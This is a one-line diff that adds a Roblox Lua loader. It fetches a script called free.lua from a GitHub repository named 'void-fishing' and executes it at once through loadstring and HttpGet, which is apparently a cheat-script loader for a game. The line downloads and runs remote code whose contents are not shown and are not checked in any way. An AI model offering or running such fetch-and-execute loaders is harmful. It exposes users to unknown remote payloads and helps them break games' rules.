@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/void-fishing/main/free.lua"))()
